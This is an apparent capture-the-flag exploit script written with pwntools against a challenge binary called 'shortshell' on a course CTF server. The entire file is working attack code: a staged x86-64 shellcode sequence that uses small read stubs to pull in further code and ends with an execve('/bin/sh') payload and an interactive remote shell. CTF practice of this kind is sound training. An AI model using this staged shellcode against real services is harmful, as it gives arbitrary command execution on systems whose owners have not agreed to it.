#!/usr/bin/env python2
from pwn import *

file = './shortshell'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10122

r, context.binary = remote(server, port), file
# ========================================================================

# rax = sys_read    = 0x0
# rdi = fd          = 0x7b          -> 0x0
# rsi = *buf        = [rbp-0x70]
# rdx = count       = [rbp-0x70]    -> 0x7b
shellcode_read = asm("""
    mov rdx, rdi
    xor rdi, rdi
    syscall
    call rsi
""")

# rax = sys_read    = 0x0
# rdi = fd          = 0x7b
# rsi = *buf        = [rbp-0x70]    -> rsp
# rdx = count       = 0x7b
shellcode_push = asm("""
    mov rsi, rsp
    syscall
    call rsp
""")

# rax = sys_execve  = 0x0           -> 59
# rdi = *filename   = 0x7b          -> "/bin/sh\0"
# rsi = argv[]      = rsp           -> 0
# rdx = envp[]      = 0x7b          -> 0
shellcode_excv = asm("""
    xor    rsi, rsi
    xor    rdx, rdx
    push   rdx
    mov    rbx, 0x68732f2f6e69622f
    push   rbx
    mov    rdi, rsp 
    mov    al, 0x3b
    syscall
""")

r.send(shellcode_read)
r.send(shellcode_push)
r.send(shellcode_excv)
r.interactive()
